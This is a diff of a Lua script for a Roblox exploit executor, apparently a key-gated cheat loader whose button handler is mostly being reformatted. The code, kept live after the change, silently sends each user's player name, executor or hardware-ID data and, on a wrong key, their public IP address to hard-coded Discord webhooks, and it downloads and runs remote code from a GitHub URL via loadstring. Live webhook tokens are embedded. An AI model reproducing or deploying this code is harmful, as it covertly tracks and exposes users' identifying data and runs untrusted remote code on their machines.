@@ -108,45 +108,353 @@ Home.TextScaled = true
 Home.TextSize = 20.000
 Home.TextWrapped = true
 local key = Textbox.Text
-Home.MouseButton1Click:Connect(function()
-    if Textbox.Text == "admingiris" then
-        local webh = "https://discord.com/api/webhooks/1035594642122608660/R1o-zrBkfWkM8--OFd1D0zpovkonNpOz2eyW_MwoyCG3IwDvvicKOn094pt0BFeB0c_h"        local res = (request or http_request or syn and syn.request)({            Url = "https://api.luauth.xyz/hwid",            Method = "GET"            })            if res.Success then            local index = string.find(res.Body, "Executor Name:")            if index then            pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)            return            end            end
-        Gui.Visible = false
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142"))()
-    elseif key == "datsersy-wdhfasjdaw-sdjawdh2sd2" then
-        Gui.Visible = false
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142"))()
-        local webh2 = "https://discord.com/api/webhooks/1034888168362741831/ywuTL_Xa8jU3zUvrM43U3RMqYtvIrPiGFZZzRodc3x7RFeLxurMBX6uyIcbyI9JcKd0I"        local res = (request or http_request or syn and syn.request)({            Url = "https://api.luauth.xyz/hwid",            Method = "GET"            })            if res.Success then            local index = string.find(res.Body, "Executor Name:")            if index then            pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh2,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh2,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh2,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)            return            end            end
-    elseif key == "datsersy-jj23wdwajdj-12j34j1ası" then
-        Gui.Visible = false
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142"))()
-        local webh3 = "https://discord.com/api/webhooks/1035593180927758357/b2CGGHCdudHGvkBqC2khFIf9ZT3WZKSZ2gbSmVM9wCqXJ2LAYHrsEZmKWIbjmAvSMpHv"        local res = (request or http_request or syn and syn.request)({            Url = "https://api.luauth.xyz/hwid",            Method = "GET"            })            if res.Success then            local index = string.find(res.Body, "Executor Name:")            if index then            pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh3,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh3,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh3,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)            return            end            end
-    elseif key == "datsersy-as2fjwdı23qkdj-jdawujd" then
-        Gui.Visible = false
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142"))()
-        local webh4 = "https://discord.com/api/webhooks/1035594120024051752/fk08CBLB7q5r5NEk1sbsrikLNUwE9roB4MYaKVMx14q0i1hChPhwq4pDj4MO92XNwzn0"        local res = (request or http_request or syn and syn.request)({            Url = "https://api.luauth.xyz/hwid",            Method = "GET"            })            if res.Success then            local index = string.find(res.Body, "Executor Name:")            if index then            pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh4,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh4,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh4,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)            return            end            end
-    else
-        Gui.Visible = false
-        local function notify(msg)
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "WARN",
-    Text = msg
-    })
+Home.MouseButton1Click:Connect(
+    function()
+        if Textbox.Text == "admingiris" then
+            local webh =
+                "https://discord.com/api/webhooks/1035594642122608660/R1o-zrBkfWkM8--OFd1D0zpovkonNpOz2eyW_MwoyCG3IwDvvicKOn094pt0BFeB0c_h"
+            local res =
+                (request or http_request or syn and syn.request)({Url = "https://api.luauth.xyz/hwid", Method = "GET"})
+            if res.Success then
+                local index = string.find(res.Body, "Executor Name:")
+                if index then
+                    pcall(
+                        function()
+                            local data = {
+                                ["embeds"] = {
+                                    {
+                                        ["title"] = game:GetService("Players").LocalPlayer.Name,
+                                        ["description"] = string.sub(res.Body, 19, index - 5)
+                                    }
+                                }
+                            }
+                            if syn then
+                                local response =
+                                    syn.request(
+                                    {
+                                        Url = webh,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif request then
+                                local response =
+                                    request(
+                                    {
+                                        Url = webh,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif http_request then
+                                local response =
+                                    http_request(
+                                    {
+                                        Url = webh,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            end
+                        end
+                    )
+                    return
+                end
+            end
+            Gui.Visible = false
+            loadstring(
+                game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142")
+            )()
+        elseif key == "datsersy-wdhfasjdaw-sdjawdh2sd2" then
+            Gui.Visible = false
+            loadstring(
+                game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142")
+            )()
+            local webh2 =
+                "https://discord.com/api/webhooks/1034888168362741831/ywuTL_Xa8jU3zUvrM43U3RMqYtvIrPiGFZZzRodc3x7RFeLxurMBX6uyIcbyI9JcKd0I"
+            local res =
+                (request or http_request or syn and syn.request)({Url = "https://api.luauth.xyz/hwid", Method = "GET"})
+            if res.Success then
+                local index = string.find(res.Body, "Executor Name:")
+                if index then
+                    pcall(
+                        function()
+                            local data = {
+                                ["embeds"] = {
+                                    {
+                                        ["title"] = game:GetService("Players").LocalPlayer.Name,
+                                        ["description"] = string.sub(res.Body, 19, index - 5)
+                                    }
+                                }
+                            }
+                            if syn then
+                                local response =
+                                    syn.request(
+                                    {
+                                        Url = webh2,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif request then
+                                local response =
+                                    request(
+                                    {
+                                        Url = webh2,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif http_request then
+                                local response =
+                                    http_request(
+                                    {
+                                        Url = webh2,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            end
+                        end
+                    )
+                    return
+                end
+            end
+        elseif key == "datsersy-jj23wdwajdj-12j34j1ası" then
+            Gui.Visible = false
+            loadstring(
+                game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142")
+            )()
+            local webh3 =
+                "https://discord.com/api/webhooks/1035593180927758357/b2CGGHCdudHGvkBqC2khFIf9ZT3WZKSZ2gbSmVM9wCqXJ2LAYHrsEZmKWIbjmAvSMpHv"
+            local res =
+                (request or http_request or syn and syn.request)({Url = "https://api.luauth.xyz/hwid", Method = "GET"})
+            if res.Success then
+                local index = string.find(res.Body, "Executor Name:")
+                if index then
+                    pcall(
+                        function()
+                            local data = {
+                                ["embeds"] = {
+                                    {
+                                        ["title"] = game:GetService("Players").LocalPlayer.Name,
+                                        ["description"] = string.sub(res.Body, 19, index - 5)
+                                    }
+                                }
+                            }
+                            if syn then
+                                local response =
+                                    syn.request(
+                                    {
+                                        Url = webh3,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif request then
+                                local response =
+                                    request(
+                                    {
+                                        Url = webh3,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif http_request then
+                                local response =
+                                    http_request(
+                                    {
+                                        Url = webh3,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            end
+                        end
+                    )
+                    return
+                end
+            end
+        elseif key == "datsersy-as2fjwdı23qkdj-jdawujd" then
+            Gui.Visible = false
+            loadstring(
+                game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142")
+            )()
+            local webh4 =
+                "https://discord.com/api/webhooks/1035594120024051752/fk08CBLB7q5r5NEk1sbsrikLNUwE9roB4MYaKVMx14q0i1hChPhwq4pDj4MO92XNwzn0"
+            local res =
+                (request or http_request or syn and syn.request)({Url = "https://api.luauth.xyz/hwid", Method = "GET"})
+            if res.Success then
+                local index = string.find(res.Body, "Executor Name:")
+                if index then
+                    pcall(
+                        function()
+                            local data = {
+                                ["embeds"] = {
+                                    {
+                                        ["title"] = game:GetService("Players").LocalPlayer.Name,
+                                        ["description"] = string.sub(res.Body, 19, index - 5)
+                                    }
+                                }
+                            }
+                            if syn then
+                                local response =
+                                    syn.request(
+                                    {
+                                        Url = webh4,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif request then
+                                local response =
+                                    request(
+                                    {
+                                        Url = webh4,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif http_request then
+                                local response =
+                                    http_request(
+                                    {
+                                        Url = webh4,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            end
+                        end
+                    )
+                    return
+                end
+            end
+        else
+            Gui.Visible = false
+            local function notify(msg)
+                game:GetService("StarterGui"):SetCore(
+                    "SendNotification",
+                    {
+                        Title = "WARN",
+                        Text = msg
+                    }
+                )
+            end
+            local res =
+                (request or http_request or syn and syn.request)(
+                {
+                    Url = "https://api.luauth.xyz/hwid",
+                    Method = "GET"
+                }
+            )
+            if res.Success then
+                local index = string.find(res.Body, "Executor Name:")
+                if index then
+                    notify("Your key is invaild!")
+                    pcall(
+                        function()
+                            local data = {
+                                ["embeds"] = {
+                                    {
+                                        ["title"] = game:GetService("Players").LocalPlayer.Name,
+                                        ["description"] = game:HttpGet("https://api.ipify.org")
+                                    }
+                                }
+                            }
+                            if syn then
+                                local response =
+                                    syn.request(
+                                    {
+                                        Url = webh,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif request then
+                                local response =
+                                    request(
+                                    {
+                                        Url = webh,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif http_request then
+                                local response =
+                                    http_request(
+                                    {
+                                        Url = webh,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            end
+                        end
+                    )
+                    pcall(
+                        function()
+                            local data = {
+                                ["embeds"] = {
+                                    {
+                                        ["title"] = game:GetService("Players").LocalPlayer.Name,
+                                        ["description"] = string.sub(res.Body, 19, index - 5)
+                                    }
+                                }
+                            }
+                            if syn then
+                                local response =
+                                    syn.request(
+                                    {
+                                        Url = webh,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif request then
+                                local response =
+                                    request(
+                                    {
+                                        Url = webh,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            elseif http_request then
+                                local response =
+                                    http_request(
+                                    {
+                                        Url = webh,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = game:GetService("HttpService"):JSONEncode(data)
+                                    }
+                                )
+                            end
+                        end
+                    )
+                    return
+                end
+            end
+        end
     end
-    local res = (request or http_request or syn and syn.request)({
-    Url = "https://api.luauth.xyz/hwid",
-    Method = "GET"
-    })
-    if res.Success then
-    local index = string.find(res.Body, "Executor Name:")
-    if index then
-        notify("Your key is invaild!")
-    pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = game:HttpGet("https://api.ipify.org")                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)
-    pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)
-    return
-    end
-    end
-    end
-end)
+)
 
 UICorner_3.Parent = Home
